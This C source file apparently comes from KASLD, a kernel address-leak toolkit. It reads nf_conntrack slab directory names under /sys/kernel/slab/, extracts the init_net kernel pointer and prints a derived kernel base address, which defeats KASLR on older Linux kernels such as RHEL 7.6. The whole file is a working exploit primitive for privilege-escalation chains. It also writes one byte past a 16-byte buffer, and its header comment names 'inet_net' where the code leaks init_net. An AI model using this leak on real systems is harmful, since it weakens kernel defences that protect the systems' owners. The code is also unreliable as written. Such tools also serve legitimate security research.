// This file is part of KASLD - https://github.com/bcoles/kasld
// Retrieve inet_net kernel symbol virtual address from /sys/kernel/slab/nf_conntrack_*
// Patched some time around 2016, but still present in RHEL 7.6 as of 2018
// - https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
// ---
// <bcoles@gmail.com>

#include <dirent.h> 
#include <string.h>
#include <stdio.h> 
#include <stdlib.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

unsigned long get_kernel_addr_conntrack() {
  unsigned long addr = 0;
  struct dirent *dir;
  const char* path = "/sys/kernel/slab/";
  const char* needle = "nf_conntrack";
  const int addr_len = 16; /* 64-bit */
  char d_path[256];
  char addr_buf[addr_len];

  printf("[.] trying %s ...\n", path);

  DIR* d = opendir(path);

  if (d == NULL) {
    printf("opendir(%s): %m\n", path);
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s", dir->d_name);

    if (strncmp(d_path, needle, strlen(needle)) != 0)
      continue;

    memcpy(addr_buf, &d_path[strlen(needle) + 1], addr_len);
    addr_buf[addr_len] = '\0';

    char* endptr = &addr_buf[addr_len];
    addr = strtoul(&addr_buf[0], &endptr, 16);

    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  closedir(d);

  return addr;
}

int main (int argc, char **argv) {
  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  unsigned long addr = get_kernel_addr_conntrack();
  if (!addr) return 1;

  printf("leaked init_net: %lx\n", addr);

  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
  } else {
    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
  }

  return 0;
}
